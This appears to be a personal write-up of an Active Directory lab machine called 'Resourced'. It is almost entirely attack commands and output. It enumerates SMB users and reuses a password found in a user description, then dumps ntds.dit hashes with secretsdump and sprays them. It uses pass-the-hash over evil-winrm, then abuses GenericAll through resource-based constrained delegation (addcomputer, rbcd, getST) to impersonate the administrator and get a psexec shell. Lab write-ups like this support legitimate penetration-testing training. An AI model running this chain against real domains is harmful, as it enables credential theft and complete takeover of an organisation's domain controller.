`nxc smb IP -u '' -p '' --users` -- shows a bunch of users
in the description, it showed password for V.Ventz HotelCalifornia194!

he doesnt have proper winrm or rdp, but he has a readable share, "Password Audit"
```zsh
smbclient \\\\192.168.233.175\\'Pasword Audit' -U V.Ventz
#gave us ntds.dit, SYSTEM hive

impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > domain_secrets.txt
#gave us a bunch of hashes, including admin's, but that dint work

#so we separate usernames and hashes to do a 1-on-1 brute-force
head -n27 domain_secrets.txt | tail -n 14 > hash.try
cat hash.try | awk -F':' '{print $1}' > h_users.txt
cat hash.try | awk -F':' '{print $4}' > h_hashes.txt

nxc smb 192.168.233.175 -u h_users.txt -H h_hashes.txt --no-bruteforce --continue-on-success
#we see it worked for #resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
#resourced.local\V.Ventz:913c144caea1c0a936fd1ccb46929d3c

#Since we already cleared Venz's shares, Mr.Livingstone is next
#nothing new in shares
#but he does have winrm access
evil-winrm -i 192.168.233.175  -u 'L.Livingstone' -H '19a3a7550ce8c505c2d46b5e39d6f808'

bloodhound-ce-python -u 'V.Ventz' -p 'HotelCalifornia194!' -ns 192.168.233.175 -d resourced.local -c All --zip
```
Running bloodhound, we find Mr.Livingstone here, has GenericAll over Resourced.resourced.local - the DC itself
```zsh
impacket-addcomputer  -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-ip 192.168.233.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 'resourced.local/L.Livingstone'
#can verify with winrm> get-adcomputer attack

impacket-rbcd -dc-ip 192.168.233.175 -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'RESOURCEDC$' -action 'write' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 'resourced.local/L.Livingstone'

impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate 'administrator' 'resourced.local/attackersystem$:Summer2018!'
#this should save administrator's ticket to a .ccache file
#not sure why cifs/ but we need it

export KRB5CCNAME=administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache
#Then we use impacket-wmiexec or psexec to get the admin shell.
impacket-psexec -no-pass -k resourced.local/administrator@resourcedc.resourced.local
```
Admin!